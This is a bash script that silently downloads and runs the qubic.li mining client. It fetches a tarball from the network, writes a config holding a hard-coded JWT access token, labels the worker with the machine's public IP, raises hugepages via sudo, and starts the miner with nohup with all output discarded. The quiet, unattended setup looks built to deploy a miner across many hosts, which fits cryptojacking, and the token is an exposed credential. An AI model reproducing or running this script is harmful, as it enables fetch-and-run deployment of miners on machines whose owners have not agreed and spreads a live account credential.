#!/bin/bash

token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImQyNjkwMTRlLTE5MmItNDUxZS1iZjhkLTYyYjQ0OGQ5ODU2OCIsIk1pbmluZyI6IiIsIm5iZiI6MTczMzcwNjI1MywiZXhwIjoxNzY1MjQyMjUzLCJpYXQiOjE3MzM3MDYyNTMsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.noFQZ3YHEN_kA_Oi03iiY4hS_jGgmOnlFrXXjnH8bHPB9mWJy5MfIfuT2X8ltG4F5ebh7_GgjzgRZeCbJzY2teAvcwFBfb3aCRuhPqrx28VuRd6ZYeHWb9hObfqNY4ifw9zA6sz3UvlQZ0YSuo8uJWG8EnPZWXgePbeOwu6xJdUbzlo64ssGa6gRgyxXQTMLX60Zx0_MMBWum7-q2s2QMArhCvutdBO0NEu53lHeKIm-wb7d5K-JGMg5U4-DsDgkylelf2lO2seZCXflL-FJkLZekHobE81GYJ-eUF7mWbL3Q3SY3YmPr2oUuEAgXRX18we9DojQQqA4tY0y8a8lhQ"
version="3.1.1"
hugepage="128"
work=`mktemp -d`

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"

wget --no-check-certificate -qO- "https://dl.qubic.li/downloads/qli-Client-${version}-Linux-x64.tar.gz" |tar -zx -C "${work}"
[ -f "${work}/qli-Client" ] || exit 1

cat >"${work}/appsettings.json"<< EOF
{
  "ClientSettings": {
    "pps": false,
    "accessToken": "${token}",
    "alias": "${addr}",
    "trainer": {
      "cpu": true,
      "gpu": false
    },
    "autoUpdate": false
  }
}
EOF


sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget icu-devtools >/dev/null 2>&1 || apt -qqy install wget icu-devtools >/dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1


chmod -R 777 "${work}"
cd "${work}"
nohup ./qli-Client >/dev/null 2>&1 &
